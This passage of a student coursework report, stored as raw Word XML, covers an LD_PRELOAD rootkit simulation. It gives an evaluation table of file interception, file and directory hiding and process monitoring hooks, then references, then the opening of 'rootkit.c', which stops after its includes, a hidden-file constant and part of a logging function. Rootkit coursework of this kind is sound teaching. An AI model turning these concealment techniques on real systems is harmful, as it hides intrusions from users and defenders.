      <w:tr w:rsidR="009C1980" w14:paraId="1FD59278" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25C2BCB1" w14:textId="77777777" w:rsidR="00D728AA" w:rsidRDefault="00BA6FB0">
            <w:r>
              <w:t>File access interception demonstrated at runtime (open)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3ACDA71F" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7E911B69" w14:textId="77777777" w:rsidR="00D728AA" w:rsidRDefault="00BA6FB0">
            <w:r>
              <w:t>Figs. 10-11</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="74A46DD1" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F60BADE" w14:textId="77777777" w:rsidR="00D728AA" w:rsidRDefault="00BA6FB0">
            <w:r>
              <w:t>Metadata and directory concealment demonstrated at runtime (statx, readdir)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1CEDB61C" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="66701361" w14:textId="77777777" w:rsidR="00D728AA" w:rsidRDefault="00BA6FB0">
            <w:r>
              <w:t>Figs. 11, 13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D728AA" w14:paraId="68BA89ED" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3334" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6315D53F" w14:textId="77777777" w:rsidR="00D728AA" w:rsidRDefault="00BA6FB0">
            <w:r>
              <w:t>Additional hooks implemented in source (openat, read, stat, lstat, access)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="57A2C87F" w14:textId="77777777" w:rsidR="00D728AA" w:rsidRDefault="00BA6FB0">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1AF29E95" w14:textId="77777777" w:rsidR="00D728AA" w:rsidRDefault="00BA6FB0">
            <w:r>
              <w:t>Figs. 5-6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="74FF28B8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="574A3418" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Process execution monitored (fork/execve)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="54BD653E" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="00E1E447" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Figs. 10, 13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="47315D84" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7BCA0C22" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Original functions chained through dlsym(RTLD_NEXT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1140724F" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="706E0136" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Figs. 10, 14</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="4B8F8863" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4BDD762E" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Timestamped interception log produced</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A0BABC4" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7CC924A3" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Fig. 13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="60DD415E" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5C700B84" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Student ID cb012653 visible in every screenshot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5176A0B7" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F007D8C" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Figs. 1-14</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2321A75D" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc241601977"/>
      <w:r>
        <w:t>References</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="5D1E6A0F" w14:textId="218F9E77" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t xml:space="preserve">Kerrisk, M. (2024) Linux Programmer's Manual: ld.so(8), dlsym(3), open(2), readdir(3), execve(2), fork(2), statx(2). Available at: </w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:history="1">
        <w:r w:rsidR="00324158" w:rsidRPr="00384C4D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://man7.org/linux/man-pages/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00324158">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Accessed: 29 September 2026).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D7A207" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>Levine, J.R. (2000) Linkers and Loaders. San Francisco: Morgan Kaufmann.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556FEBEA" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>Hasan, M.S. (2026) Linux Rootkits: Mechanics and Defense. COMP60024 Operating Systems Internals and Biometrics, Staffordshire University.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BA5623" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>Hasan, M.S. (2026) Process Management in Linux (Lecture 7). COMP60024 Operating Systems Internals and Biometrics, Staffordshire University.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2487464C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc241601978"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Appendix A - Source Code</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="74A09352" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:r>
        <w:t>The complete source of the two files submitted with this report is reproduced below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F409617" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:r>
        <w:t>rootkit.c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BCAE05F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310E8B8F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> * rootkit.c - user-space rootkit simulation via LD_PRELOAD function hooking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160CA7EC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> * COMP60024 OSIB - Part C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E92BA55" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> * Student: Faraj Farook   ID: CB012653</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E035885" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4167DA15" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#define _GNU_SOURCE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48262375" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;stdio.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2B1272" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;stdlib.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616FA289" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;stdarg.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BB5D2E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;string.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F26768" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;dlfcn.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4675D560" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;errno.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3187A07D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;fcntl.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B24A25E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;time.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0775CA84" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;dirent.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE6DFAD" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;unistd.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501FD2C1" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;sys/types.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE506F5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;sys/stat.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4048E4D5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477F94B9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#define HIDDEN_FILE "secret.txt"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047952C7" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#define LOG_PATH    "/tmp/rootkit.log"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D696067" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA42D88" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>static __thread int in_hook = 0;   /* recursion guard */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B737347" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271A3F77" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- logging ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35017573" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>static void rk_log(const char *fmt, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14037F9E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654384C5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    FILE *fp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A49787E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    time_t now;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA06E70" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    struct tm *tm_info;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B99168" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    char stamp[32];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320C3100" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    va_list ap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C0AE42" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E9EAFA" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fp = fopen(LOG_PATH, "a");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E839DB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (fp == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320079E0" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57504EC1" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEA2DC9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    now = time(NULL);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EB5289" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    tm_info = localtime(&amp;now);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36CA156E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    strftime(stamp, sizeof(stamp), "%Y-%m-%d %H:%M:%S", tm_info);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A4F7A1" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BC86B9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fprintf(fp, "[%s] [pid %d] ", stamp, getpid());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8939A1" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    va_start(ap, fmt);</w:t>
      </w:r>
    </w:p>
